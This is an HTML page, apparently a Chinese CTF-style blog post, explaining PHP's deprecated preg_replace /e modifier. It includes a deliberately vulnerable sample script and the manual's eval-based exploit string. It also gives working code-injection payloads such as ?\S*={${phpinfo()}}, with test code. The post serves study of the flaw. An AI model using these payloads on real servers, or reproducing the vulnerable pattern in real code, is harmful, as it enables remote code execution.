@@ -1,0 +1,754 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="August Rosenberg">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="函数简绍这个函数用于php 替换文本  函数的原型是 1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] ) : mixed   意思就是将$subject 中的$pattern 替换成$replacement  但是特别的是在 $">
+<meta property="og:type" content="article">
+<meta property="og:title" content="preg_replace函数分析">
+<meta property="og:url" content="https://tsy244.github.io/2024/05/09/web/preg-replace%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="AU9U5T">
+<meta property="og:description" content="函数简绍这个函数用于php 替换文本  函数的原型是 1preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] ) : mixed   意思就是将$subject 中的$pattern 替换成$replacement  但是特别的是在 $">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240509235432890.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240509235849188.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240510000028183.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240510002651637.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240510002940190.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240510004845612.png">
+<meta property="article:published_time" content="2024-05-09T15:41:36.000Z">
+<meta property="article:modified_time" content="2024-05-09T16:48:51.335Z">
+<meta property="article:author" content="August Rosenberg">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240509235432890.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>preg_replace函数分析 - AU9U5T</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"tsy244.github.io","root":"/","version":"1.9.4","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":"G-BL1W5LRRDJ","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>AU9U5T&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="preg_replace函数分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-author" aria-hidden="true"></i>
+        August Rosenberg
+      </span>
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-05-09 23:41" pubdate>
+          May 9, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          47 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">preg_replace函数分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="函数简绍"><a href="#函数简绍" class="headerlink" title="函数简绍"></a>函数简绍</h1><p>这个函数用于php 替换文本</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240509235432890.png" srcset="/img/loading.gif" lazyload alt="image-20240509235432890"></p>
+<p>函数的原型是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">preg_replace</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$pattern</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replacement</span> , <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$limit</span> = -<span class="hljs-number">1</span> [, <span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> ]] ) : <span class="hljs-keyword">mixed</span><br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>意思就是将$subject 中的$pattern 替换成$replacement</p>
+</blockquote>
+<p>但是特别的是在 $pattern中有一个匹配模式php 将其称之为模式修饰符</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240509235849188.png" srcset="/img/loading.gif" lazyload alt="image-20240509235849188"></p>
+<p>原文如下</p>
+<blockquote>
+<h1 id="模式修饰符"><a href="#模式修饰符" class="headerlink" title="模式修饰符:"></a>模式修饰符:</h1><p>下面列出了当前可用的 PCRE 修饰符。括号中提到的名字是 PCRE 内部这些修饰符的名称。 模式修饰符中的空格，换行符会被忽略，其他字符会导致错误。</p>
+<blockquote>
+<ul>
+<li><p><em>i</em> (<em>PCRE_CASELESS</em>)</p>
+<p>如果设置了这个修饰符，模式中的字母会进行大小写不敏感匹配。</p>
+</li>
+<li><p><em>m</em> (<em>PCRE_MULTILINE</em>)</p>
+<p>默认情况下，PCRE 认为目标字符串是由单行字符组成的(然而实际上它可能会包含多行)， “行首”元字符 (^) 仅匹配字符串的开始位置， 而”行末”元字符 ($) 仅匹配字符串末尾， 或者最后的换行符(除非设置了 <em>D</em> 修饰符)。这个行为和 perl 相同。 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl 的 &#x2F;m 修饰符。如果目标字符串 中没有 “\n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。</p>
+</li>
+<li><p><em>s</em> (<em>PCRE_DOTALL</em>)</p>
+<p>如果设置了这个修饰符，模式中的点号元字符匹配所有字符，包含换行符。如果没有这个 修饰符，点号不匹配换行符。这个修饰符等同于 perl 中的&#x2F;s修饰符。 一个取反字符类比如 [^a] 总是匹配换行符，而不依赖于这个修饰符的设置。</p>
+</li>
+<li><p><em>x</em> (<em>PCRE_EXTENDED</em>)</p>
+<p>如果设置了这个修饰符，模式中的没有经过转义的或不在字符类中的空白数据字符总会被忽略， 并且位于一个未转义的字符类外部的#字符和下一个换行符之间的字符也被忽略。 这个修饰符 等同于 perl 中的 &#x2F;x 修饰符，使被编译模式中可以包含注释。 注意：这仅用于数据字符。 空白字符 还是不能在模式的特殊字符序列中出现，比如序列 (?( 引入了一个条件子组(译注: 这种语法定义的 特殊字符序列中如果出现空白字符会导致编译错误。 比如(?(就会导致错误)。</p>
+</li>
+<li><p><em>e</em> (<em>PREG_REPLACE_EVAL</em>)</p>
+<p><strong>Warning</strong>This feature was <em>DEPRECATED</em> in PHP 5.5.0, and <em>REMOVED</em> as of PHP 7.0.0.如果设置了这个被弃用的修饰符， <a href="function.preg-replace.html">preg_replace()</a> 在进行了对替换字符串的 后向引用替换之后, 将替换后的字符串作为php 代码评估执行(eval 函数方式)，并使用执行结果 作为实际参与替换的字符串。单引号、双引号、反斜线(**)和 NULL 字符在 后向引用替换时会被用反斜线转义.<strong>Caution</strong>The <a href="function.addslashes.html">addslashes()</a> function is run on each matched backreference before the substitution takes place. As such, when the backreference is used as a quoted string, escaped characters will be converted to literals. However, characters which are escaped, which would normally not be converted, will retain their slashes. This makes use of this modifier very complicated.<strong>Caution</strong>请确保 <code>replacement</code> 参数由合法 php 代码字符串组成，否则 php 将会 在<a href="function.preg-replace.html">preg_replace()</a> 调用的行上产生一个解释错误。<strong>Caution</strong><em>不建议</em>使用此修饰符，它很容易产生安全漏洞：<code>&lt;?php$html = $_POST[&#39;html&#39;];// uppercase headings$html = preg_replace(  &#39;(&lt;h([1-6])&gt;(.*?)&lt;/h\1&gt;)e&#39;,  &#39;&quot;&lt;h$1&gt;&quot; . strtoupper(&quot;$2&quot;) . &quot;&lt;/h$1&gt;&quot;&#39;,  $html);</code>以上示例代码能够被这样的字符串利用： *<h1>{${eval($_GET[php_code])}}</h1>*。 这能让攻击者执行他们想要的 PHP 代码，几乎完全渗透进服务器。为了阻止此类远程代码执行攻击，可以使用 <a href="function.preg-replace-callback.html">preg_replace_callback()</a> 替代：<code>&lt;?php$html = $_POST[&#39;html&#39;];// uppercase headings$html = preg_replace_callback(  &#39;(&lt;h([1-6])&gt;(.*?)&lt;/h\1&gt;)&#39;,  function ($m) &#123;    return &quot;&lt;h$m[1]&gt;&quot; . strtoupper($m[2]) . &quot;&lt;/h$m[1]&gt;&quot;;  &#125;,  $html);</code><strong>Note</strong>:仅 <a href="function.preg-replace.html">preg_replace()</a> 使用此修饰符，其他 PCRE 函数忽略此修饰符。</p>
+</li>
+<li><p><em>A</em> (<em>PCRE_ANCHORED</em>)</p>
+<p>如果设置了这个修饰符，模式被强制为”锚定”模式，也就是说约束匹配使其仅从 目标字符串的开始位置搜索。这个效果同样可以使用适当的模式构造出来，并且 这也是 perl 种实现这种模式的唯一途径。</p>
+</li>
+<li><p><em>D</em> (<em>PCRE_DOLLAR_ENDONLY</em>)</p>
+<p>如果这个修饰符被设置，模式中的元字符美元符号仅仅匹配目标字符串的末尾。如果这个修饰符 没有设置，当字符串以一个换行符结尾时， 美元符号还会匹配该换行符(但不会匹配之前的任何换行符)。 如果设置了修饰符<em>m</em>，这个修饰符被忽略. 在 perl 中没有与此修饰符等同的修饰符。</p>
+</li>
+<li><p><em>S</em></p>
+<p>当一个模式需要多次使用的时候，为了得到匹配速度的提升，值得花费一些时间 对其进行一些额外的分析。如果设置了这个修饰符，这个额外的分析就会执行。当前， 这种对一个模式的分析仅仅适用于非锚定模式的匹配(即没有单独的固定开始字符)。</p>
+</li>
+<li><p><em>U</em> (<em>PCRE_UNGREEDY</em>)</p>
+<p>这个修饰符逆转了量词的”贪婪”模式。 使量词默认为非贪婪的，通过量词后紧跟*?* 的方式可以使其成为贪婪的。这和 perl 是不兼容的。 它同样可以使用 <a href="regexp.reference.internal-options.html">模式内修饰符设置</a> (<em>?U</em>)进行设置， 或者在量词后以问号标记其非贪婪(比如*.*?<em>)。*<em>Note</em></em>:在非贪婪模式，通常不能匹配超过 <a href="pcre.configuration.html#ini.pcre.backtrack-limit">pcre.backtrack_limit</a> 的字符。</p>
+</li>
+<li><p><em>X</em> (<em>PCRE_EXTRA</em>)</p>
+<p>这个修饰符打开了 PCRE 与 perl 不兼容的附件功能。模式中的任意反斜线后就 ingen 一个 没有特殊含义的字符都会导致一个错误，以此保留这些字符以保证向后兼容性。 默认情况下，在 perl 中，反斜线紧跟一个没有特殊含义的字符被认为是该字符的原文。 当前没有其他特性由这个修饰符控制。</p>
+</li>
+<li><p><em>J</em> (<em>PCRE_INFO_JCHANGED</em>)</p>
+<p>内部选项设置(?J)修改本地的<em>PCRE_DUPNAMES</em>选项。允许子组重名， (译注：只能通过内部选项设置，外部的 &#x2F;J 设置会产生错误。)</p>
+</li>
+<li><p><em>u</em> (<em>PCRE_UTF8</em>)</p>
+<p>此修正符打开一个与 perl 不兼容的附加功能。 模式和目标字符串都被认为是 utf-8 的。 无效的目标字符串会导致 preg_* 函数什么都匹配不到； 无效的模式字符串会导致 E_WARNING 级别的错误。 PHP 5.3.4 后，5字节和6字节的 UTF-8 字符序列被考虑为无效（resp. PCRE 7.3 2007-08-28）。 以前就被认为是无效的 UTF-8。</p>
+</li>
+</ul>
+</blockquote>
+</blockquote>
+<p>重点关注&#x2F;e模式</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240510000028183.png" srcset="/img/loading.gif" lazyload alt="image-20240510000028183"></p>
+<p>当服务器使用这个函数，并且模式选择的是<code>/e</code> 的时候，会出现将第二个参数作为php 代码进行执行</p>
+<h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><p>源代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$id</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;id&#x27;</span>] = <span class="hljs-variable">$id</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">complex</span>(<span class="hljs-params"><span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<br>        <span class="hljs-string">&#x27;/(&#x27;</span> . <span class="hljs-variable">$re</span> . <span class="hljs-string">&#x27;)/ei&#x27;</span>,<br>        <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,<br>        <span class="hljs-variable">$str</span><br>    );<br>&#125;<br><br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$re</span> =&gt; <span class="hljs-variable">$str</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">complex</span>(<span class="hljs-variable">$re</span>, <span class="hljs-variable">$str</span>) . <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在这段代码中，我们实际可以控制的参数有第一个和第三个参数，但是会被执行的第二个参数却是不能被修改的</p>
+<p>那么如何才能执行代码呢？</p>
+<h2 id="注意点1"><a href="#注意点1" class="headerlink" title="注意点1"></a>注意点1</h2><p>注意看<code>strtolower(&quot;\\1&quot;)</code> 其实这个是 \1 </p>
+<p>首先<code>\\1</code> 结果就是<code>\1</code>然后使用<code>()</code> 就会进行匹配第一个匹配缓存区</p>
+<p>官方的解释是</p>
+<blockquote>
+<p><strong>反向引用</strong></p>
+<p>对一个正则表达式模式或部分模式 <strong>两边添加圆括号</strong> 将导致相关 <strong>匹配存储到一个临时缓冲区</strong> 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 ‘\n’ 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</p>
+</blockquote>
+<p>因此这里的<code>\1</code>指的就是第一个匹配区</p>
+<h2 id="注意点2"><a href="#注意点2" class="headerlink" title="注意点2"></a>注意点2</h2><p>接着分析官方的payload </p>
+<p><strong>&#x2F;?.*&#x3D;{${phpinfo()}}</strong></p>
+<p>这个payload 经过url 被服务端获取到结果是</p>
+<p>参数名为<code>.*</code>  参数的值为<code>&#123;$&#123;phpinfo()&#125;&#125;</code> 但是这里发现是执行不了这个代码的</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240510002651637.png" srcset="/img/loading.gif" lazyload alt="image-20240510002651637"></p>
+<p>这个是因为使用<code>.*</code>进行get传参的时候，使得<code>.*</code>  &#x3D;&#x3D;&gt;  变成了  <code>_*</code></p>
+<p>因为在php 中得<code>.*</code>是非法字符</p>
+<p>这里可以使用其他方式进行绕过</p>
+<p>这里给一个通用得payload</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">?\S*=&#123;$&#123;phpinfo()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这个形式就可以成功得执行了</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240510002940190.png" srcset="/img/loading.gif" lazyload alt="image-20240510002940190"></p>
+<p>成功得执行</p>
+<h2 id="注意点3"><a href="#注意点3" class="headerlink" title="注意点3"></a>注意点3</h2><p>为什么这里一定要使用<code>&#123;$&#123;phpinfo()&#125;&#125;</code>得形式呢？为什么不能直接给一个phpinfo() 这种形式？</p>
+<p>这个是因为PHP 可变变量得原因</p>
+<p>在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 <strong>${phpinfo()}</strong> 中的 <strong>phpinfo()</strong> 会被当做变量先执行，执行后，即变成 <strong>${1}</strong> (phpinfo()成功执行返回true)</p>
+<p>一下是我的分析结果，注释也是很重点得</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><span class="hljs-variable">$temp</span> = var_dump(strtolower(phpinfo()));<br>echo <span class="hljs-string">&quot;var_dump(strtolower(phpinfo())) 结果是：&quot;</span> . <span class="hljs-variable">$temp</span>;  <span class="hljs-regexp">//</span>tmep是字符串 <span class="hljs-string">&quot;1&quot;</span>，因为phpinfo()返回的是null<br><span class="hljs-regexp">//</span> echo var_dump(preg_replace(<span class="hljs-string">&#x27;/(.*)/ie&#x27;</span>, <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<br><span class="hljs-regexp">//</span> echo <span class="hljs-string">&quot;var_dump(preg_replace(&#x27;/(.*)/ie&#x27;, &#x27;1&#x27;, &#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;)) 结果是：&quot;</span> . <span class="hljs-variable">$temp</span>; <span class="hljs-regexp">//</span>NULL 因为phpinfo() 执行了，变成了<span class="hljs-variable">$1</span>,<span class="hljs-variable">$1</span>是空<br><br><span class="hljs-regexp">//</span> <span class="hljs-variable">$temp</span> = var_dump(preg_replace(<span class="hljs-string">&#x27;/(.*)/ie&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>, <span class="hljs-string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<br><span class="hljs-regexp">//</span> echo <span class="hljs-string">&quot;var_dump(preg_replace(&#x27;/(.*)/ie&#x27;, &#x27;strtolower(\&quot;\\1\&quot;)&#x27;, &#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;)) 结果是：&quot;</span> . <span class="hljs-variable">$temp</span>; <span class="hljs-regexp">//</span>NULL 因为phpinfo() 执行了，变成了<span class="hljs-variable">$1</span>,<span class="hljs-variable">$1</span>是空<br><br><br><span class="hljs-variable">$temp</span> = var_dump(preg_replace(<span class="hljs-string">&#x27;/(.*)/ie&#x27;</span>, <span class="hljs-string">&#x27;strtolower(&quot;&#123;$&#123;phpinfo()&#125;&#125;&quot;)&#x27;</span>, <span class="hljs-string">&#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;</span>));<br>echo <span class="hljs-string">&quot;var_dump(preg_replace(&#x27;/(.*)/ie&#x27;, &#x27;strtolower(\&quot;&#123;$&#123;phpinfo()&#125;&#125;\&quot;)&#x27;, &#x27;&#123;$&#123;phpinfo()&#125;&#125;&#x27;)) 结果是：&quot;</span> . <span class="hljs-variable">$temp</span>; <span class="hljs-regexp">//</span>NULL 因为phpinfo() 执行了，变成了<span class="hljs-variable">$1</span>,<span class="hljs-variable">$1</span>是空<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?\S</span>*=&#123;<span class="hljs-variable">$&#123;</span>phpinfo()&#125;&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/image-20240510004845612.png" srcset="/img/loading.gif" lazyload alt="image-20240510004845612"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/">#web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>preg_replace函数分析</div>
+      <div>https://tsy244.github.io/2024/05/09/web/preg-replace函数分析/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>August Rosenberg</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>May 9, 2024</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/05/09/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/WEB/flask/" title="flask">
+                        <span class="hidden-mobile">flask</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://github.com/TSY244?tab=repositories" target="_blank" rel="nofollow noopener"><span>github</span></a> <i class="iconfont icon-love"></i> <a href="https://august244.github.io/" target="_blank" rel="nofollow noopener"><span>随笔</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        Views: 
+        <span id="busuanzi_value_site_pv"></span>
+        
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        Visitors: 
+        <span id="busuanzi_value_site_uv"></span>
+        
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
